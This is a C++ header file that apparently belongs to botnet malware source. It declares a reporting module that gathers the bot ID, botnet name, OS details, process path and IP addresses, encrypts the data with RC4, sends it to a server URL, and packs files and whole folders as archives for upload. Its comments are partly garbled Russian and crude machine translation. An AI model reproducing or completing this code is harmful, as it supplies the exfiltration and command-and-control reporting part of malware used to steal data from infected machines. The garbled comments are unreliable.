/*
  —бор и отправка отчетов.
*/
#pragma once

#include "..\common\crypt.h"
#include "..\common\binstorage.h"
#include "..\common\threadsgroup.h"

namespace Report
{
  typedef struct _SERVERSESSION
  {
    LPSTR url; //URL of the server.


    typedef int (*REQUESTPROC)(DWORD loop, _SERVERSESSION *session);
    REQUESTPROC requestProc;

    
    typedef int (*RESULTPROC)(DWORD loop, _SERVERSESSION *session);
    RESULTPROC resultProc;

    HANDLE stopEvent; //Signal priryvaniya.

    //Data on the encryption key for pPostData. The key is not to be stagnant during the processing of requests.
    Crypt::RC4KEY *rc4Key;

    BinStorage::STORAGE *postData; //Post data to the mandrel. When you send a _Run can be as NULL,
                                   //So already created. But not after BinStorage:: _pack!

    void *customData; //EXTRA data to external functions.
  }SERVERSESSION;

  //Exit codes for REQUESTPROC.
  enum
  {
    SSPR_CONTUNUE, //Prodlozhit vypolenenie.
    SSPR_END,      //Session is over.
    SSPR_ERROR     //The session ended with an error.
  };

  //The main types of information to be added to the log.
  enum
  {
    BIF_BOT_ID       = 0x01, //Adding BOTID and botnet.
    BIF_BOT_VERSION  = 0x02, //Adding a version of the bot.
    BIF_TIME_INFO    = 0x04, //Adding data about time.
    BIF_OS           = 0x08, //Adding information about the OS.
    BIF_PROCESS_FILE = 0x10, //Way process.
    BIF_IP_ADDRESSES = 0x20  //List of IP-addresses.
  };

  enum
  {
    WFAA_RECURSE = 0x1 //Save subdirectory.
  };

 
  void init(void);

  
  void uninit(void);

  bool addBasicInfo(BinStorage::STORAGE **binStorage, DWORD flags);


  bool _create(ThreadsGroup::GROUP *group);

  
  bool startServerSession(SERVERSESSION *session);


  bool writeData(DWORD type, LPWSTR sourcePath, LPWSTR destPath, void *data, DWORD dataSize);


  bool writeIStream(DWORD type, LPWSTR sourcePath, LPWSTR destPath, IStream *data);

  
  bool writeString(DWORD type, LPWSTR sourcePath, LPWSTR destPath, LPWSTR string);
    

  bool writeStringFormat(DWORD type, LPWSTR sourcePath, LPWSTR destPath, LPWSTR format, ...);


  bool writeFile(LPWSTR file, LPWSTR sourcePath, LPWSTR destPath);
  

  bool writeFolderAsArchive(LPWSTR path, LPWSTR *fileMask, DWORD fileMaskCount, LPWSTR destPath, DWORD flags);
};
